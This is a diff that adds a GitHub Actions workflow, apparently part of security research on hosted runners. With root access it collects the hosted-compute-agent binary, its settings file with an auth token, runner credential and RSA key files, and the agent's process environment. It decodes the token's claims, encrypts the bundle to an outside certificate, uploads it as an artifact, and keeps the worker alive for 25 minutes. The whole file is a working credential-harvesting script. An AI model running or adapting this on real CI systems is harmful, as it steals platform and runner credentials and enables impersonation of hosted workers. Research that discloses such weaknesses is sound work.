@@ -1,0 +1,121 @@
+name: r9n-hca-encrypted-pair
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  capture-and-hold:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    env:
+      F004_CAPTURE_CERT: ${{ secrets.F004_CAPTURE_CERT }}
+      F004_JOB_CANARY: ${{ secrets.F004_JOB_CANARY }}
+    steps:
+      - name: Capture and encrypt current worker state
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          test -n "$F004_CAPTURE_CERT"
+          test -n "$F004_JOB_CANARY"
+
+          raw="$RUNNER_TEMP/f004-raw"
+          sealed="$RUNNER_TEMP/f004-sealed"
+          mkdir -p "$raw/hca" "$raw/runner" "$sealed"
+
+          sudo cp -a /opt/hca/hosted-compute-agent "$raw/hca/"
+          sudo cp -a /opt/hca/.settings "$raw/hca/"
+          sudo cp -a /opt/hca/logs "$raw/hca/" 2>/dev/null || true
+          sudo find /opt/hca -maxdepth 3 -printf '%M %u %g %s %TY-%Tm-%TdT%TH:%TM:%TS %p\n' \
+            > "$raw/hca-file-manifest.txt"
+
+          sudo systemctl cat hosted-compute-agent > "$raw/hca-systemd-unit.txt" 2>&1 || true
+          sudo systemctl show hosted-compute-agent > "$raw/hca-systemd-properties.txt" 2>&1 || true
+          sudo journalctl --no-pager -u hosted-compute-agent > "$raw/hca-journal.txt" 2>&1 || true
+          ps -eo user,pid,ppid,lstart,args --ww > "$raw/processes.txt"
+          sudo ss -tpn > "$raw/tcp-connections.txt" 2>&1 || true
+
+          while IFS= read -r -d '' source_file; do
+            relative_path="${source_file#/home/runner/}"
+            destination="$raw/runner/$relative_path"
+            mkdir -p "$(dirname "$destination")"
+            sudo cp -a "$source_file" "$destination"
+          done < <(sudo find /home/runner -maxdepth 6 -type f \
+            \( -name '.runner' -o -name '.agent' -o -name '.credentials' \
+               -o -name '.credentials_rsaparams' -o -name '.setup_info' \) \
+            -print0 2>/dev/null)
+
+          hca_pid=$(pgrep -o -f '/opt/hca/hosted-compute-agent' || true)
+          if [[ -n "$hca_pid" ]]; then
+            sudo tr '\0' '\n' < "/proc/$hca_pid/environ" > "$raw/hca-process-environ.txt" 2>/dev/null || true
+            sudo tr '\0' ' ' < "/proc/$hca_pid/cmdline" > "$raw/hca-process-cmdline.txt" 2>/dev/null || true
+          fi
+
+          printf '%s' "$F004_JOB_CANARY" > "$raw/JOB_CANARY.txt"
+          printf '%s\n' "$F004_CAPTURE_CERT" > "$RUNNER_TEMP/f004-certificate.pem"
+          sudo chown -R "$USER:$USER" "$raw"
+
+          python3 - "$raw" "$sealed/metadata.json" <<'PY'
+          import base64
+          import hashlib
+          import json
+          import os
+          import pathlib
+          import sys
+
+          raw = pathlib.Path(sys.argv[1])
+          output = pathlib.Path(sys.argv[2])
+          binary = raw / "hca" / "hosted-compute-agent"
+          settings_file = raw / "hca" / ".settings"
+          settings = json.loads(settings_file.read_text())
+          token = settings["authToken"]
+          payload = token.split(".")[1]
+          payload += "=" * (-len(payload) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(payload))
+          canary = os.environ["F004_JOB_CANARY"].encode()
+
+          metadata = {
+              "repository": os.environ["GITHUB_REPOSITORY"],
+              "run_id": os.environ["GITHUB_RUN_ID"],
+              "run_attempt": os.environ["GITHUB_RUN_ATTEMPT"],
+              "job": os.environ["GITHUB_JOB"],
+              "runner_name": os.environ["RUNNER_NAME"],
+              "runner_os": os.environ["RUNNER_OS"],
+              "runner_arch": os.environ["RUNNER_ARCH"],
+              "worker_id": claims.get("wid"),
+              "token_issuer": claims.get("iss"),
+              "token_subject": claims.get("sub"),
+              "token_environment": claims.get("env"),
+              "canary_sha256": hashlib.sha256(canary).hexdigest(),
+              "hca_binary_sha256": hashlib.sha256(binary.read_bytes()).hexdigest(),
+              "hca_binary_size": binary.stat().st_size,
+              "settings_sha256": hashlib.sha256(settings_file.read_bytes()).hexdigest(),
+          }
+          output.write_text(json.dumps(metadata, indent=2) + "\n")
+          print(json.dumps(metadata, indent=2))
+          PY
+
+          tar -C "$raw" -cf "$RUNNER_TEMP/f004-payload.tar" .
+          openssl cms -encrypt -binary -aes-256-cbc \
+            -in "$RUNNER_TEMP/f004-payload.tar" \
+            -outform DER \
+            -out "$sealed/payload.cms" \
+            "$RUNNER_TEMP/f004-certificate.pem"
+          shasum -a 256 "$sealed/payload.cms" | awk '{print $1}' > "$sealed/payload.cms.sha256"
+          shred -u "$RUNNER_TEMP/f004-payload.tar" "$RUNNER_TEMP/f004-certificate.pem"
+          sudo rm -rf "$raw"
+
+      - name: Upload ciphertext only
+        uses: actions/upload-artifact@v4
+        with:
+          name: f004-sealed-${{ github.event.repository.name }}-${{ github.run_id }}
+          path: ${{ runner.temp }}/f004-sealed
+          retention-days: 1
+          compression-level: 0
+
+      - name: Hold controlled worker live
+        shell: bash
+        run: sleep 1500
